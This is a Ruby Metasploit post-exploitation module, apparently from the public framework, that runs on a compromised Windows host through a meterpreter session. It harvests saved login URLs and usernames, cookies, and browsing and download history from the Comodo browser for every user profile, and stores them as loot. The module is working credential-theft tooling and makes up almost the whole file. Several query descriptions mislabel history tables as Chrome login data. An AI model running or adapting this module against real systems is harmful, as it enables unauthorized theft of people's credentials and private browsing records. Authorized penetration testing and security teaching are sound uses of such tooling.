##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Packrat

  ARTIFACTS =
    {
      application: 'comodo',
      app_category: 'browsers',
      gatherable_artifacts: [
        {
          filetypes: 'logins',
          path: 'LocalAppData',
          dir: 'Comodo',
          artifact_file_name: 'Login Data',
          description: "Comodo's saved Username and Passwords",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'logins',
              sql_column: 'action_url, username_value'
            }
          ]
        },
        {
          filetypes: 'cookies',
          path: 'LocalAppData',
          dir: 'Comodo',
          artifact_file_name: 'Cookies',
          description: "Comodo's saved cookies",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Cookie data",
              sql_table: 'cookies',
              sql_column: 'host_key, name, path'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'LocalAppData',
          dir: 'Comodo',
          artifact_file_name: 'History',
          description: "Comodo's History",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'urls',
              sql_column: 'url'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'keyword_search_terms',
              sql_column: 'lower_term'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'downloads',
              sql_column: 'current_path, tab_referrer_url'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'segments',
              sql_column: 'name'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'downloads_url_chains',
              sql_column: 'url'
            }
          ]
        },
        {
          filetypes: 'web_history',
          path: 'LocalAppData',
          dir: 'Comodo',
          artifact_file_name: 'Visited Links',
          description: "Comodo's History",
          credential_type: 'sqlite',
          sql_search: [
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'urls',
              sql_column: 'url'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'keyword_search_terms',
              sql_column: 'lower_term'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'downloads',
              sql_column: 'current_path, tab_referrer_url'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'segments',
              sql_column: 'name'
            },
            {
              sql_description: "Database Commands which exports Chrome's Login data",
              sql_table: 'downloads_url_chains',
              sql_column: 'url'
            }
          ]
        }
      ]
    }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Comodo Credential Gatherer',
        'Description' => %q{
          This module searches for credentials stored in Comodo on a Windows host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Kazuyoshi Maruta',
          'Daniel Hallsworth',
          'Barwar Salim M',
          'Z. Cliffe Schreuders' # http://z.cliffe.schreuders.org
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptRegexp.new('REGEX', [false, 'Match a regular expression', '^password']),
        OptBool.new('STORE_LOOT', [false, 'Store artifacts into loot database', true]),
        OptBool.new('EXTRACT_DATA', [false, 'Extract data and stores in a separate file', true]),
        # enumerates the options based on the artifacts that are defined below
        OptEnum.new('ARTIFACTS', [
          false,
          'Type of artifacts to collect',
          'All',
          ARTIFACTS[:gatherable_artifacts].map do |k|
            k[:filetypes]
          end.uniq.unshift('All')
        ])
      ]
    )
  end

  def run
    print_status('Filtering based on these selections:  ')
    print_status("ARTIFACTS: #{datastore['ARTIFACTS'].capitalize}")
    print_status("STORE_LOOT: #{datastore['STORE_LOOT']}")
    print_status("EXTRACT_DATA: #{datastore['EXTRACT_DATA']}\n")

    # used to grab files for each user on the remote host
    grab_user_profiles.each do |userprofile|
      run_packrat(userprofile, ARTIFACTS)
    end

    print_status('PackRat credential sweep completed')
  end
end
